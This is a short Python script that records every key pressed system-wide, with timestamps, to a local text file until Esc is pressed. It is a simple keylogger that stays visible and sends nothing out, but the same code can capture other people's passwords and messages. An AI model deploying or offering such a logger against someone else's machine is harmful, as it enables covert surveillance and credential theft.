import keyboard
import os
from datetime import datetime

def onKeyboardEvent(event):
    """
    Callback function to handle keyboard events.
    
    This function is called whenever a keyboard event occurs. It logs the 
    name of the key that was pressed to a log file.

    Parameters:
    event (keyboard.KeyboardEvent): The event object containing information 
                                    about the keyboard event.
    """
    try:
        with open(log_file, 'a') as file:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            file.write('{} - {}\n'.format(timestamp,event.name))
    except Exception as e:
        print("Error encountered: {}".format(e))


def main(log_file):
    """
    Main function to set up the keyboard event listener and log key presses.

    Parameters:
    log_file (str): The path to the log file where key presses will be recorded.
    """
    
    try:
        # Set up the keyboard event listener
        keyboard.on_press(onKeyboardEvent)
        keyboard.wait('esc') # exit on 'esc' key pressed
    except KeyboardInterrupt:
        print("\nLogging stopped.")
    except Exception as e:
        print("Error setting up listener: {}".format(e))

if __name__ == "__main__":
    log_file = 'log_file.txt'
    main(log_file)